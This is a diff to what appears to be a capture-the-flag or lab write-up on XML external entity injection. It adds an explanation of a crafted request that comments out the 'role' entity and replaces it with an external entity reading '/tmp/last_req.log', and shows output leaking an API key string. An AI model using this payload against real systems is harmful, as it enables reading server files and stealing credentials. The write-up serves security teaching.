@@ -41,11 +41,17 @@ The second request will generate XML that looks like this: (note the contents of
 <!DOCTYPE userCard [
 <!ENTITY firstName "fn">
 <!ENTITY lastName "ln">
-<!--"><!ENTITY role "role"> --><!ENTITY role SYSTEM "/tmp/last_req.log">
+<!--"><!ENTITY role "role">--><!ENTITY role SYSTEM "/tmp/last_req.log">
 ]>
 <userInfo>
 <fullRef>fn ln, Expected API Key: H858FDSKL49FK09K4590KFK2390KCFVC12 | Received API Key: wrong</fullRef>
 <firstName>fn</firstName>
 <lastName>ln</lastName>
 </userInfo>
+```
+
+GitHub isn't displaying the commenting correctly, but focus on the line below.. The second request we send it crafted in such a way that we comment out the 'role' entity only to overwrite it with our own injected entity..
+
+```xml
+<!--"><!ENTITY role "role">--><!ENTITY role SYSTEM "/tmp/last_req.log">
 ```
